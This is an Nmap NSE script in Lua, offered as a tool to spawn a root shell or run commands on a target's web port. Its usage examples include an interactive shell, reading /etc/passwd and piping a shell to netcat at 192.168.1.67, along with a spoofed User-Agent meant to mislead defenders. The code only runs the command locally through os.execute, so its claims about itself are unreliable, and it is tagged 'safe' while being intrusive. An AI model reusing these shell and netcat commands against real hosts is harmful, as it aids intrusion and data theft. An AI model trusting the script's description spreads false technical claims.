---
-- Nmap NSE suid-shell.nse - Version 1.2
-- Copy nse to: /usr/share/nmap/scripts/suid-shell.nse
-- Update db  : sudo nmap --script-updatedb
-- executing  : nmap --script-help file-checker.nse
---


-- SCRIPT BANNER DESCRIPTION --
description = [[

Author: Maky, r00t-3xp10it
NSE script to spawn a root shell on SUID OR simple execute an remote system command.
This module accepts arguments like: User.command (system-command-to-execute-on-target)
and: FakeUser.agent (The user-agent to send in header request -> Default: Macintosh,Firefox)

Some Syntax examples:
nmap --script-help suid-shell.nse
nmap -sS -Pn -p 8080 --script suid-shell.nse <target or domain>
nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=/bin/bash" <target or domain>
nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=/bin/sh -i" <target or domain>
nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=cat /etc/passwd" <target or domain>
nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=/bin/sh | nc 192.168.1.67 8080" <target or domain>
nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "agent=Mozilla/5.0 (compatible; EvilMonkey)" <target or domain>
nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=ls -a,agent=Mozilla/5.0 (compatible; EvilMonkey)" <target or domain>

]]

---
-- @usage
-- nmap --script-help suid-shell.nse
-- nmap -sS -Pn -p 8080 --script suid-shell.nse <target or domain>
-- nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=/bin/bash" <target or domain>
-- nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=/bin/sh -i" <target or domain>
-- nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=cat /etc/passwd" <target or domain>
-- nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=/bin/sh | nc 192.168.1.67 8080" <target or domain>
-- nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "agent=Mozilla/5.0 (compatible; EvilMonkey)" <target or domain>
-- nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=ls -a,agent=Mozilla/5.0 (compatible; EvilMonkey)" <target or domain>
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | suid-shell:
-- |   module author: r00t-3xp10it
-- |     user-agent : Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
-- |_    sys-command: /bin/sh | nc 192.168.1.67 8080
--
-- @args User.command   -> The command to be executed -> Default: /bin/bash
-- @args FakeUser.agent -> The User-agent to send in header request -> Default: Macintosh,Firefox
---

author = "Maky, r00t-3xp10it"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"intrusive", "discovery", "safe"}



-- DEPENDENCIES (lua nse libraries) --
local os = require "os"
local http = require "http"
local stdnse = require ('stdnse')
local shortport = require "shortport"


  -- THE RULE SECTION --
  portrule = shortport.http
  local command = stdnse.get_script_args(SCRIPT_NAME..".command") or "/bin/bash"
  local agent_string = stdnse.get_script_args(SCRIPT_NAME..".agent") or "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5"
  -- Manipulate header requests with false info about attacker
  local options = {header={}}
  options['header']['User-Agent'] = stdnse.get_script_args(SCRIPT_NAME..".agent") or "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5" --> use Macintosh,firefox User-agent OR your own...
  options['header']['Accept-Language'] = "en-GB,en;q=0.8,sv" --> use en-GB as attacker default install language
  options['header']['Cache-Control'] = "no-store" -->  Instruct webserver to not write it to disk (do not to cache it)


-- THE ACTION SECTION --
action = function(host, port, options)
  -- execute system command (args)
  os.execute(""..command.."")
  return "\n  module author: r00t-3xp10it\n    user-agent : "..agent_string.."\n    sys-command: "..command.."\n"
end

